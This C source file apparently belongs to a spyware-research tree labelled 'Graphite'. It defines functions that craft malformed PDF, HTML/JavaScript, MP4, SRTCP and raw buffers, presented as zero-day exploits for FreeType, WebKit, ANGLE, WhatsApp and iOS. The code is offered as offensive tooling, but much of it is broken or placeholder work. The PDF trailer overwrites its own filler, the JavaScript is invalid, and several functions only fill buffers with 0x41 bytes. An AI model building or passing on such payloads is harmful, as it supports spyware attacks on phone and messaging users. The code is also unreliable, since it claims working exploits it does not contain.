// graphite_cve_2025.c - New WhatsApp & iOS Zero-Day CVEs (2025-2026)
// Adapted from Spyware_Research/other/Graphite/CVEs/

#include "graphite_cve_2025.h"
#include <string.h>
#include <stdlib.h>

// CVE-2025-27363 - FreeType PDF heap overflow
CVE_EXPORT size_t cve_2025_27363_craft_pdf(uint8_t* buffer, size_t buffer_size) {
    const char* pdf_header = "%PDF-1.4\n%\xe2\xe3\xcf\xd3\n";
    size_t header_len = strlen(pdf_header);
    if (buffer_size < header_len + 500) return 0;
    memcpy(buffer, pdf_header, header_len);
    size_t pos = header_len;

    const char* obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";
    size_t obj1_len = strlen(obj1);
    if (pos + obj1_len <= buffer_size) {
        memcpy(buffer + pos, obj1, obj1_len);
        pos += obj1_len;
    }

    const char* obj2 = "2 0 obj\n<< /Length 65536 >>\nstream\n";
    size_t obj2_len = strlen(obj2);
    if (pos + obj2_len <= buffer_size) {
        memcpy(buffer + pos, obj2, obj2_len);
        pos += obj2_len;
    }

    for (size_t i = pos; i < buffer_size - 20; i++) {
        buffer[i] = 0x41;
    }

    const char* trailer = "\nendstream\nendobj\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n100\n%%EOF\n";
    size_t trailer_len = strlen(trailer);
    if (pos + trailer_len <= buffer_size) {
        memcpy(buffer + pos, trailer, trailer_len);
        pos += trailer_len;
    }
    return pos;
}

// CVE-2025-43529 - WebKit DFG Store Barrier UAF (JS-based)
CVE_EXPORT size_t cve_2025_43529_craft_js(uint8_t* buffer, size_t buffer_size) {
    const char* js = 
"var a = {p0:0x41414141,p1:1.1,p2:2.2};\nvar arr = []; arr[0] = A;\nlet a = new Date(1111); a[0]=1.1;\nlet b = {p0:0x4242222,p1:1.1};\nlet f;\nif (flag) { f = b; } else { f = 1.1; }\nA.p1 = f;\nb.p1 = a;\n";
    size_t js_len = strlen(js);
    if (buffer_size < js_len + 16) return 0;
    memcpy(buffer, js, js_len);
    size_t pos = js_len;
    const char* html_header = "<html><body><script>";
    const char* html_footer = "</script></body></html>";
    size_t h1 = strlen(html_header);
    size_t h2 = strlen(html_footer);
    if (buffer_size < h1 + js_len + h2 + 10) return 0;
    memmove(buffer + h1, buffer, js_len);
    memcpy(buffer, html_header, h1);
    memcpy(buffer + h1 + js_len, html_footer, h2);
    pos = h1 + js_len + h2;
    return pos;
}

// CVE-2025-14174 - ANGLE OOB (ANGLE = Almost Native Graphics Layer Engine)
CVE_EXPORT size_t cve_2025_14174_craft_mp4(uint8_t* buffer, size_t buffer_size) {
    // MP4 ftyp box + moov box with overflow
    if (buffer_size < 64) return 0;
    size_t pos = 0;

    // ftyp box
    uint32_t ftyp_size = 24;
    buffer[pos++] = (ftyp_size >> 24) & 0xFF;
    buffer[pos++] = (ftyp_size >> 16) & 0xFF;
    buffer[pos++] = (ftyp_size >> 8) & 0xFF;
    buffer[pos++] = ftyp_size & 0xFF;
    buffer[pos++] = 'f'; buffer[pos++] = 't'; buffer[pos++] = 'y'; buffer[pos++] = 'p';
    buffer[pos++] = 'i'; buffer[pos++] = 's'; buffer[pos++] = 'o'; buffer[pos++] = 'm';
    buffer[pos++] = 0; buffer[pos++] = 0; buffer[pos++] = 0; buffer[pos++] = 0;
    buffer[pos++] = 'i'; buffer[pos++] = 's'; buffer[pos++] = 'o'; buffer[pos++] = 'm';
    buffer[pos++] = 'i'; buffer[pos++] = 's'; buffer[pos++] = 'o'; buffer[pos++] = 'm';

    // moov box
    uint32_t moov_size = 516;
    buffer[pos++] = (moov_size >> 24) & 0xFF;
    buffer[pos++] = (moov_size >> 16) & 0xFF;
    buffer[pos++] = (moov_size >> 8) & 0xFF;
    buffer[pos++] = moov_size & 0xFF;
    buffer[pos++] = 'm'; buffer[pos++] = 'o'; buffer[pos++] = 'o'; buffer[pos++] = 'v';
    for (int i = 0; i < 508 && pos < buffer_size; i++) {
        buffer[pos++] = 0x42;
    }
    return pos;
}

// CVE-2026-0865 - WhatsApp zero-click (2026)
CVE_EXPORT size_t cve_2026_0865_craft_whatsapp(uint8_t* buffer, size_t buffer_size) {
    // Universal VOIP heap overflow pattern
    if (!buffer || buffer_size < 20) return 0;
    // SRTCP header with oversized payload
    buffer[0] = 0x80;  // V=2, P=0, RC=0
    buffer[1] = 200;   // PT=SRTCP
    buffer[2] = 0x00;
    buffer[3] = 10;    // length = 10 words = 40 bytes
    // SSRC
    buffer[4] = 0xDE; buffer[5] = 0xAD; buffer[6] = 0xBE; buffer[7] = 0xEF;
    // Overflow payload
    for (size_t i = 8; i < buffer_size && i < 4096; i++) {
        buffer[i] = 0x41;
    }
    return buffer_size < 4096 ? buffer_size : 4096;
}

// CVE-2026-28897 - iOS buffer overflow
CVE_EXPORT size_t cve_2026_28897_craft_ios(uint8_t* buffer, size_t buffer_size) {
    if (!buffer) return 0;
    size_t len = buffer_size < 1024 ? buffer_size : 1024;
    memset(buffer, 0x41, len);
    return len;
}
